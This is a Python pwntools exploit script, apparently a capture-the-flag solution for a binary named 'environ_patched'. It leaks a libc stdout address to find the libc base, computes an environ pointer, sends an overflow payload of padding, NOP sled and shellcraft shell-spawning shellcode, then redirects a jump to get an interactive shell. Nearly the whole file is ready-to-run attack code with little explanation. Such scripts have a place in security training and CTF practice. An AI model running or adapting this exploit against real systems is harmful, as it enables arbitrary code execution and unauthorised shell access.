from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './environ_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = ELF("libc.so.6")
p.recvuntil(b'stdout: ')
leak = int(p.recvuntil(b'\n').decode('utf-8'), 16)
libc.address = leak - libc.symbols['_IO_2_1_stdout_']
info("libc_base: %#x" % libc.address)
environ_libc = libc.address + 0x3c6f38
info("environ_libc: %#x" % environ_libc)
p.sendlineafter(b"Size: ",str(350).encode())
payload = b'a'*280 + b'\x90' * 10
payload += bytes(asm(shellcraft.sh()))
payload = payload.ljust(350, b'\x90')
p.sendlineafter(b"Data: ",payload)
p.sendlineafter(b"*jmp=",str(environ_libc).encode())
p.interactive()